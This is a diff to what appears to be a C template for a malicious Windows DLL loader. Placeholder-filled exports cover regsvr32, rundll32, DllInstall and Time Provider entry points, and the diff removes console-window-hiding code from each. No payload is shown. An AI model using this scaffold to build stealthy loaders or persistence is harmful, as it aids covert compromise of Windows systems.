@@ -68,10 +68,6 @@ DWORD $thread(void) {
 }
 
 EXPORT HRESULT WINAPI VoidFunc(void) {
-    HANDLE c = GetConsoleWindow();
-    if (c != NULL) {
-        ShowWindow(c, 0);
-    }
     $export();
 }
 EXPORT HRESULT WINAPI DllCanUnloadNow(void) {
@@ -79,24 +75,12 @@ EXPORT HRESULT WINAPI DllCanUnloadNow(void) {
     return 1;
 }
 EXPORT HRESULT WINAPI DllRegisterServer(void) {
-    HANDLE c = GetConsoleWindow();
-    if (c != NULL) {
-        ShowWindow(c, 0);
-    }
     $export();
 }
 EXPORT HRESULT WINAPI DllUnregisterServer(void) {
-    HANDLE c = GetConsoleWindow();
-    if (c != NULL) {
-        ShowWindow(c, 0);
-    }
     $export();
 }
 EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
-    HANDLE c = GetConsoleWindow();
-    if (c != NULL) {
-        ShowWindow(c, 0);
-    }
     $export();
 }
 EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
@@ -106,10 +90,6 @@ EXPORT HRESULT WINAPI RegisterModule(DWORD v, void *m, void *g) {
     return 0;
 }
 EXPORT HRESULT WINAPI DllGetClassObject(void *x, void *i, void *p) {
-    HANDLE c = GetConsoleWindow();
-    if (c != NULL) {
-        ShowWindow(c, 0);
-    }
     $export();
 }
 EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
@@ -121,10 +101,6 @@ EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHa
 }
 
 EXPORT VOID WINAPI $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
-    HANDLE c = GetConsoleWindow();
-    if (c != NULL) {
-        ShowWindow(c, 0);
-    }
     $secondary();
 }
 
